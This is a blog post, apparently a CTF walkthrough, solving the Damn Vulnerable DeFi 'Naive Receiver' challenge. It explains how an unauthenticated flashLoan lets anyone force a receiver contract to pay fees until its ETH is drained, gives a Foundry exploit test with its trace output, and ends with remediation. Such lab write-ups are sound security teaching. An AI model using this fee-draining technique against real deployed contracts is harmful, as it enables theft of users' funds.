@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Vasiliy Yorkin">
+<meta name="description" content="Challenge There&rsquo;s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
+You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
+Drain all ETH funds from the user&rsquo;s contract. Doing it in a single transaction is a big plus ;)
+Damn Vulnerable DeFi Analysis The challange contains two contracts:">
+<meta name="keywords" content="Vasiliy Yorkin">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF walkthrough, Damn Vulnerable DeFi, #2 Naive Receiver"/>
+<meta name="twitter:description" content="Challenge There&rsquo;s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
+You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
+Drain all ETH funds from the user&rsquo;s contract. Doing it in a single transaction is a big plus ;)
+Damn Vulnerable DeFi Analysis The challange contains two contracts:"/>
+
+<meta property="og:title" content="CTF walkthrough, Damn Vulnerable DeFi, #2 Naive Receiver" />
+<meta property="og:description" content="Challenge There&rsquo;s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
+You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
+Drain all ETH funds from the user&rsquo;s contract. Doing it in a single transaction is a big plus ;)
+Damn Vulnerable DeFi Analysis The challange contains two contracts:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-2-naive-receiver/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-09T20:25:00+03:00" />
+<meta property="article:modified_time" content="2022-08-09T20:25:00+03:00" />
+
+
+
+
+  <title>vyorkin.org</title>
+
+  
+  <link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-2-naive-receiver/">
+  
+
+  <link rel="preload" href="https://vyorkin.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.bce1ad3fd9463aca56f0ae393ff86fb2a0d51b58b56e32625fa4af028409f02d.css" integrity="sha256-vOGtP9lGOspW8K45P/hvsqDVG1i1bjJiX6SvAoQJ8C0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+  
+  
+    
+    
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.e2e6584ce20683687b57e321b1116fbb5051e3534cc7846c9baccff833431b67.css" integrity="sha256-4uZYTOIGg2h7V&#43;MhsRFvu1BR41NMx4Rsm6zP&#43;DNDG2c=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+   
+
+
+
+
+  <link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
+<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  
+
+  <meta name="generator" content="Hugo 0.101.0" />
+
+
+  
+
+</head>
+
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://vyorkin.org/">
+      vyorkin.org
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/about/">4b0u7</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/posts/">bl06</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/ru-ru/">ru</a>
+              </li>
+            
+          
+            
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/de-de/">de</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-2-naive-receiver/">
+              CTF walkthrough, Damn Vulnerable DeFi, #2 Naive Receiver
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-08-09T20:25:00&#43;03:00">
+                August 9, 2022
+              </time>
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="https://vyorkin.org/categories/blockchain/">blockchain</a>
+      <span class="separator">•</span>
+    <a href="https://vyorkin.org/categories/ctf/">ctf</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/blockchain/">blockchain</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/ctf/">ctf</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/security/">security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h2 id="challenge">
+  Challenge
+  <a class="heading-link" href="#challenge">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<blockquote class="quote2 quote2-question"><p>There&rsquo;s a lending pool offering quite expensive flash loans of
+Ether, which has 1000 ETH in balance.</p>
+<p>You also see that a user has deployed a contract with 10 ETH in
+balance, capable of interacting with the lending pool and
+receiveing flash loans of ETH.</p>
+<p>Drain all ETH funds from the user&rsquo;s contract. Doing it in a
+single transaction is a big plus ;)</p>
+      <span class="quote2-author">Damn Vulnerable DeFi</span>
+    
+</blockquote>
+
+<h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>The challange contains two contracts:</p>
+<ul>
+<li><code>NaiveReceiverLenderPool</code> &ndash; Lending pool.</li>
+<li><code>FlashLoanReceiver</code> &ndash; User&rsquo;s contract for receiveing
+flash loans.</li>
+</ul>
+<p>Same as in the previous challenge, <code>NaiveReceiverLenderPool</code>
+inherits <code>ReentrancyGuard</code> and its <code>flashLoan</code> function has the
+<code>nonReentrant</code> modifier. So we won&rsquo;t look for re-entrancy
+vulnerabilities. It has the <code>receive</code> function, which allows ETH
+deposits. I guess it is need to setup the challenge. The
+<code>fixedFee</code> function is trivial. Let&rsquo;s have a closer look at the
+<code>flashLoan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">address</span> borrower, <span style="color:#fff;font-weight:bold">uint256</span> borrowAmount)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">external</span>
+</span></span><span style="display:flex;"><span>    nonReentrant
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; borrowAmount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughETHInPool();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!borrower.isContract()) <span style="color:#fff;font-weight:bold">revert</span> BorrowerMustBeADeployedContract();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Transfer ETH and handle control to receiver
+</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    borrower.functionCallWithValue(
+</span></span><span style="display:flex; background-color:#191919"><span>        <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(<span style="color:#0ff;font-weight:bold">&#34;receiveEther(uint256)&#34;</span>, FIXED_FEE),
+</span></span><span style="display:flex; background-color:#191919"><span>        borrowAmount
+</span></span><span style="display:flex; background-color:#191919"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &lt; balanceBefore + FIXED_FEE)
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It takes the <code>borrower</code> and checks that it is a contract address
+(not an EOA). You might think it would be better to assume that
+<code>msg.sender</code> is a borrower, but they&rsquo;ve decided the make it a
+parameter for some reason 🤔. Next, it ensures that the pool has
+enough funds to lend. Then it calls the <code>receiveEther</code>
+function transferring the <code>borrowAmount</code> and passing the
+<code>FIXED_FEE</code> constant as an argument. Finally it checks that the
+borrowed amount plus fixed fee has been repaid.</p>
+<p>Now, let&rsquo;s concentrate on the <code>FlashLoanReceiver</code> contract. It
+keeps a reference to the pool which is set in the constructor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> <span style="color:#fff;font-weight:bold">private</span> pool;
+</span></span></code></pre></div><p>The <code>receiveEther</code> function checks that the sender is a pool.
+Ensures that the contract has enough Ether to repay the
+<code>amountToBeRepaid</code>, which is <code>msg.value + fee</code>. Then it executes
+the <code>_executeActionDuringFlashLoan</code> and returns funds to the
+poll by calling <code>pool.sendValue(amountToBeRepaid)</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> receiveEther(<span style="color:#fff;font-weight:bold">uint256</span> fee) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> {
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> != pool) <span style="color:#fff;font-weight:bold">revert</span> SenderMustBePool();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amountToBeRepaid = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> + fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &lt; amountToBeRepaid)
+</span></span><span style="display:flex; background-color:#191919"><span>        <span style="color:#fff;font-weight:bold">revert</span> CannotBorrowThatMuch();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    _executeActionDuringFlashLoan();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Return funds to pool
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    pool.sendValue(amountToBeRepaid);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>_executeActionDuringFlashLoan</code> function is empty and has the <code>internal</code> visibility.</p>
+<p>Notice that it doesn&rsquo;t check who initiated the flash loan. It
+means anyone can request a flash loan on behalf of the
+<code>FlashLoanReceiver</code> contract to make it pay the fee.</p>
+<h2 id="exploit">
+  Exploit
+  <a class="heading-link" href="#exploit">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>It turns out we can waste all user’s contract funds on flash
+loans with high fees in a single transaction. To do that we must
+force it to receive 10 flash loans in a row paying 1 ETH fee
+each time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> flashFee = naiveReceiverLenderPool.fixedFee();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">while</span> (<span style="color:#fff;font-weight:bold">true</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> flashAmount = <span style="color:#fff;font-weight:bold">address</span>(flashLoanReceiver).<span style="color:#fff;font-weight:bold">balance</span> - flashFee;
+</span></span><span style="display:flex;"><span>        naiveReceiverLenderPool.flashLoan(
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">address</span>(flashLoanReceiver),
+</span></span><span style="display:flex;"><span>            flashAmount
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(flashLoanReceiver).<span style="color:#fff;font-weight:bold">balance</span> == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    validation();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract NaiveReceiver -vvvv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/Levels/naive-receiver/NaiveReceiver.t.sol:NaiveReceiver
+</span></span><span style="display:flex;"><span>[PASS] testExploit() (gas: 187772)
+</span></span><span style="display:flex;"><span>Logs:
+</span></span><span style="display:flex;"><span>  🧨 PREPARED TO BREAK THINGS 🧨
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Traces:
+</span></span><span style="display:flex;"><span>  [187772] NaiveReceiver::testExploit()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(Attacker: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [146] Pool::fixedFee() [staticcall]
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000</span>
+</span></span><span style="display:flex;"><span>    ├─ [20314] Pool::flashLoan(Receiver: [...], 9000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [9598] Receiver::receiveEther{value: 9000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 10000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 8000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 8000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 9000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 7000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 7000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 8000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 6000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 6000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 7000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 5000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 5000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 6000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 4000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 4000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 5000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 3000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 3000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 4000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 2000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 2000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 3000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [16314] Pool::flashLoan(Receiver: [...], 1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther{value: 1000000000000000000}(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 2000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [9932] Pool::flashLoan(Receiver: [...], 0)
+</span></span><span style="display:flex;"><span>    │   ├─ [7598] Receiver::receiveEther(1000000000000000000)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [55] Pool::fallback{value: 1000000000000000000}()
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    └─ ← ()
+</span></span></code></pre></div><h2 id="remediation">
+  Remediation
+  <a class="heading-link" href="#remediation">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li>In the <code>NaiveReceiverLenderPool</code>&rsquo;s <code>flashLoan</code> function assume
+that <code>msg.sender</code> is the borrower.</li>
+<li>Add an authentication to the <code>FlashLoanReceiver</code> contract.</li>
+</ul>
+<h2 id="notes-and-references">
+  Notes &amp; References
+  <a class="heading-link" href="#notes-and-references">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>The
+<a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-isContract-address-">isContract</a>
+and
+<a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-sendValue-address-payable-uint256-">sendValue</a>
+functions comes from the
+<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol">OpenZeppelin&rsquo;s
+Address library</a>.</p>
+<p>The <code>sendValue</code> is implemented like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> sendValue(<span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> recipient, <span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">internal</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &gt;= amount, <span style="color:#0ff;font-weight:bold">&#34;Address: insufficient balance&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#fff;font-weight:bold">bool</span> success, ) = recipient.<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: amount}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">require</span>(success, <span style="color:#0ff;font-weight:bold">&#34;Address: unable to send value, recipient may have reverted&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<p>Thank you for reading!
+The full code is <a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/naive-receiver/NaiveReceiver.t.sol#L49-L65">here</a>.
+Let&rsquo;s move on to the next challenge &ndash;
+<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-3-truster">#3
+Truster</a>.</p>
+
+        
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"
+    integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"
+    integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js"
+    integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      1985 -
+    
+    2022
+     Vasiliy Yorkin 
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="https://vyorkin.org/js/coder.min.b9a9a8f029e2fd416957bf8489db1b684799393553df358655a1b614ec7c5ef9.js" integrity="sha256-uamo8Cni/UFpV7&#43;EidsbaEeZOTVT3zWGVaG2FOx8Xvk="></script>
+  
+
+  
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-F8R77TYF8B', { 'anonymize_ip': false });
+}
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
